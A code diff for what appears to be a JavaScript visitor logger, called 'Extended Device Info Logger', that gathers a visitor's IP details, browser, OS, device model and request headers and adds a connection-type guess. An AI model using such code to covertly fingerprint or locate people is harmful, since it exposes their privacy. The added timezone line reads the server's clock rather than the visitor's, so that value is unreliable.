@@ -24,7 +24,6 @@ async function getIpDetails(ip) {
     }
 }
 
-// Enhanced device detection to get browser, OS, device model, and screen resolution
 function detectDeviceDetails(userAgent) {
     let deviceType = "Desktop";
     let os = "Unknown";
@@ -33,14 +32,12 @@ function detectDeviceDetails(userAgent) {
     let deviceModel = "Unknown";
     let approxScreenResolution = "Unknown";
 
-    // Detect Device Type
     if (/Mobile|Android|iPhone|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
         deviceType = "Mobile";
     } else if (/Tablet|iPad/i.test(userAgent)) {
         deviceType = "Tablet";
     }
 
-    // Detect Operating System
     if (/Windows NT 10.0/.test(userAgent)) os = "Windows 10";
     else if (/Windows NT 6.3/.test(userAgent)) os = "Windows 8.1";
     else if (/Windows NT 6.2/.test(userAgent)) os = "Windows 8";
@@ -50,7 +47,6 @@ function detectDeviceDetails(userAgent) {
     else if (/Linux/.test(userAgent)) os = "Linux";
     else if (/iPhone|iPad|iPod/.test(userAgent)) os = "iOS";
 
-    // Detect Browser and Version
     const browserMatches = userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera|Edg)\/([\d.]+)/);
     if (browserMatches) {
         browser = browserMatches[1];
@@ -61,7 +57,6 @@ function detectDeviceDetails(userAgent) {
         browserVersion = versionMatch ? versionMatch[2] : "Unknown";
     }
 
-    // Detect Device Model (for mobile devices)
     if (deviceType === "Mobile") {
         if (/iPhone/.test(userAgent)) deviceModel = "iPhone";
         else if (/iPad/.test(userAgent)) deviceModel = "iPad";
@@ -71,11 +66,10 @@ function detectDeviceDetails(userAgent) {
         }
     }
 
-    // Approximate Screen Resolution (based on known device models)
-    if (deviceModel === "iPhone") approxScreenResolution = "1170x2532"; // Example for iPhone 12
+    if (deviceModel === "iPhone") approxScreenResolution = "1170x2532"; 
     else if (deviceModel === "iPad") approxScreenResolution = "1536x2048";
-    else if (/Samsung/.test(deviceModel)) approxScreenResolution = "1080x2400"; // Example for Samsung Galaxy S20
-    else if (deviceType === "Desktop") approxScreenResolution = "1920x1080"; // Common for desktops
+    else if (/Samsung/.test(deviceModel)) approxScreenResolution = "1080x2400";
+    else if (deviceType === "Desktop") approxScreenResolution = "1920x1080";
 
     return {
         deviceType,
@@ -103,15 +97,19 @@ export default async function handler(req, res) {
             return;
         }
 
-        // Gather additional information from request headers
         const userAgent = req.headers['user-agent'] || 'Unknown';
         const acceptLanguage = req.headers['accept-language'] || 'Unknown';
         const acceptEncoding = req.headers['accept-encoding'] || 'Unknown';
         const doNotTrack = req.headers['dnt'] === '1' ? 'Yes' : 'No';
         const referer = req.headers['referer'] || 'No referer';
         
-        // Detect detailed device information
         const deviceDetails = detectDeviceDetails(userAgent);
+
+        const connectionType = ipDetails.isp?.includes('Fiber') ? 'Fiber' :
+                               ipDetails.isp?.includes('DSL') ? 'DSL' :
+                               ipDetails.isp?.includes('Cable') ? 'Cable' : 'Unknown';
+
+        const timezoneOffset = new Date().getTimezoneOffset() / -60;
 
         const message = {
             username: "Extended Device Info Logger",
